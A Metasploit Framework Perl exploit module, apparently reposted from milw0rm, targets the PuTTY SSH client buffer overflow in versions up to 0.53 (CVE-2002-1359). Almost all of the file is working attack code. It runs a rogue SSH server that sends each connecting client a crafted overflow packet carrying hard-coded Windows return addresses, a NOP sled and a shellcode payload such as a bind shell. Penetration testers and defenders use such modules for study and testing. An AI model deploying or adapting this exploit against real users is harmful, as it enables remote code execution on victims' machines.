##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::putty_ssh;

use strict;
use base "Msf::Exploit";
use Pex::Text;
use IO::Socket::INET;
use  POSIX;

my $advanced =
  {
  };

my $info =
  {
	'Name'           => 'PuTTy.exe <= v0.53 Buffer Overflow',
	'Version'        => '$Revision: 1.1 $',
	'Authors'        => [ 'y0 [at] w00t-shell.net' ],
	'Description'    =>
	  Pex::Text::Freeform(qq{
		This module exploits a buffer overflow in the PuTTY SSH client that is triggered
		through a validation error in SSH.c.
}),

	'Arch'           => [ 'x86' ],
	'OS'             => [ 'win32', 'winxp', 'win2000', 'win2003' ],
	'Priv'           => 0,

	'UserOpts'       =>
	  {
		'SSHDPORT'   => [ 1, 'PORT', 'The local SSHD listener port',  22         ],
		'SSHSERVER'  =>  [ 1, 'HOST', 'The local SSHD listener host', "0.0.0.0"  ],
	  },

	'AutoOpts' => { 'EXITFUNC' => 'process' },

	'Payload'      =>
	  {
		'Space'    => 400,
		'BadChars' => "\x00",
		'Prepend'  => "\x81\xc4\xff\xef\xff\xff\x44",
		'MaxNops'  => 0,
		'Keys'     => [ '-ws2ord', '-bind' ],
	  },

	'Refs'            =>
	  [
		[ 'URL', 'http://www.rapid7.com/advisories/R7-0009.html' ],
		[ 'CVE', '2002-1359' ],

	  ],

	'DefaultTarget'  => 0,

	'Targets'        =>
	  [
		[ 'Windows 2000 SP4 English',   0x77e14c29 ],
		[ 'Windows XP SP2 English',     0x76b43ae0 ],
		[ 'Windows 2003 SP1 English',   0x76AA679b ],
	  ],

	'Keys'           => [ 'putty' ],

	'DisclosureDate' => 'December 16 2002',
  };

sub new
{
	my $class = shift;
	my $self;

	$self = $class->SUPER::new(
		{
			'Info'     => $info,
			'Advanced' => $advanced,
		},
		@_);

	return $self;
}

sub Exploit
{
	my $self = shift;
	my $server = IO::Socket::INET->new(
		LocalHost => $self->GetVar('SSHSERVER'),
		LocalPort => $self->GetVar('SSHDPORT'),
		ReuseAddr => 1,
		Listen    => 1,
		Proto     => 'tcp');
	my $client;

	# Did the listener create fail?
	if (not defined($server))
	{
		$self->PrintLine("[-] Failed to create local SSHD listener on " . $self->GetVar('SSHDPORT'));
		return;
	}

	$self->PrintLine("[*] Waiting for connections to " . $self->GetVar('SSHSERVER') . ":" . $self->GetVar('SSHDPORT') . "...");

	while (defined($client = $server->accept()))
	{
		$self->HandlePuttyClient(fd => Msf::Socket::Tcp->new_from_socket($client));
	}

	return;
}

sub HandlePuttyClient
{
	my $self = shift;
	my ($fd) = @{{@_}}{qw/fd/};
	my $target    = $self->Targets->[$self->GetVar('TARGET')];
	my $shellcode = $self->GetVar('EncodedPayload')->Payload;
	my $rhost;
	my $rport;

	# Set the remote host information
	($rport, $rhost) = ($fd->PeerPort, $fd->PeerAddr);

	my $sploit =
	  "SSH-2.0-OpenSSH_3.6.1p2\r\n".
	  "\x00\x00\x4e\xec\x01\x14".
	  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
	  "\x00\x00\x00\x00\x00\x00\x00\x00\x07\xde".
	  (((((Pex::Text::AlphaNumText(64)). ",") x 30). Pex::Text::AlphaNumText(64). "\x00\x00\x07\xde") x 2).
	  (((Pex::Text::AlphaNumText(64)). ",") x 2). Pex::Text::AlphaNumText(21).
	  pack('V', $target->[1]). $self->MakeNops(10). $shellcode.
	  (((Pex::Text::AlphaNumText(64)). ",") x 15). Pex::Text::AlphaNumText(64). "\x00\x00\x07\xde".
	  (((Pex::Text::AlphaNumText(64)). ",") x 30). Pex::Text::AlphaNumText(64). "\x00\x00\x07\xde".
	  (((Pex::Text::AlphaNumText(64)). ",") x 21). Pex::Text::AlphaNumText(64). "\x00\x00\x07\xde".
	  (((((Pex::Text::AlphaNumText(64)). ",") x 30). Pex::Text::AlphaNumText(64). "\x00\x00\x07\xde") x 6).
	  "\x00\x00\x00\x00\x00\x00";

	$self->PrintLine("[*] Client connected from $rhost:$rport...");

	$fd->Send($sploit);

	$self->PrintLine("[*] Sending ". length($sploit). " bytes to remote host...");

	$self->Handler($fd);

	$fd->Close();
}

1;

# milw0rm.com [2006-05-15]
